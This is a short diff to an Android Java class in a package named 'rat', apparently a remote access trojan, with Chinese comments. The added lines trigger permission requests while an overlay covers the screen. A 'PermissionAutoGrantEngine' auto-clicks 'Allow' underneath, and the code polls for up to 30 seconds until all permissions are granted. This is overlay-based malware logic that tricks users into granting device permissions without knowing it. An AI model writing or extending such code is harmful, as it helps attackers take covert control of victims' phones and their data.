@@ -222,6 +222,15 @@ public abstract class BlockViewHelper {
                             }
                             // vendor: T0(5) = 200ms * 5 = 1s — 等待动画完成
                             try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
+
+                            // app 已回到前台、遮罩还在 → 触发权限请求
+                            // PermissionAutoGrantEngine 在遮罩下自动点击"允许"
+                            com.vendor.rat.activity.ActivMain.triggerPermissionRequest();
+                            // 轮询等待权限全部授予（最多 30 秒）
+                            for (int pw = 0; pw < 60; pw++) {
+                                if (com.vendor.rat.activity.ActivMain.allPermissionsGranted()) break;
+                                try { Thread.sleep(500); } catch (InterruptedException ignored) { break; }
+                            }
                         }
 
                         // 然后移除 View
